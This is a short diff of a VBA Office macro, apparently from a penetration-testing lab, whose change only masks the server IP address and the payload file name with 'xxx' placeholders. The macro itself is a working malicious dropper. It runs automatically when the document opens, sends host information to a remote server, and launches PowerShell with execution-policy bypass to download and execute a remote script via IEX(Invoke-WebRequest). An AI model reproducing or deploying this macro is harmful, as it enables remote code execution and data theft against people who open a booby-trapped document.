@@ -1,7 +1,7 @@
 ```bash
 Sub AutoOpen()
     Dim strServer As String
-    strServer = "http://192.168.45.232/"
+    strServer = "http://192.168.xxx.xxx/"
 
     ' Send host information to server
     Dim objHTTP As Object
@@ -18,7 +18,7 @@ Sub AutoOpen()
         Dim objShell As Object
         Set objShell = CreateObject("WScript.Shell")
         ' Run PowerShell and invoke remote script on server
-        objShell.Run "powershell -exec bypass -c IEX(Invoke-WebRequest -Uri """ & strServer & "files/inv-iu.ps1"" -UseBasicParsing)"
+        objShell.Run "powershell -exec bypass -c IEX(Invoke-WebRequest -Uri """ & strServer & "files/xxx.ps1"" -UseBasicParsing)"
     End If
 End Sub
 
